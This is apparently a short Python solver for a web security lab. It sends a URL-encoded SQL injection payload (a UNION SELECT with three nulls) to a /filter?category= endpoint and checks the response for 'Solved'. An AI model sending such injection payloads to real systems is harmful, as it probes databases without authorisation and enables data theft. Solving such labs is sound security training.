import requests
import re

url = input('Enter the URL the lab provide: ');
domain = re.search(r'^(https?://[^/]+)', url).group(1)
session = requests.Session()

payload_url = domain + '/filter?category=%27%20Union%20select%20null%2C%20null%2C%20null%20%2D%2D'
try:
    r = session.get(payload_url)
except requests.exceptions.ConnectionError:
    print('Error connecting to the server. Check your URL.')

# print(r.text)

if ('Solved' in r.text):
    print('Solved')
else:
    print('Not Solved')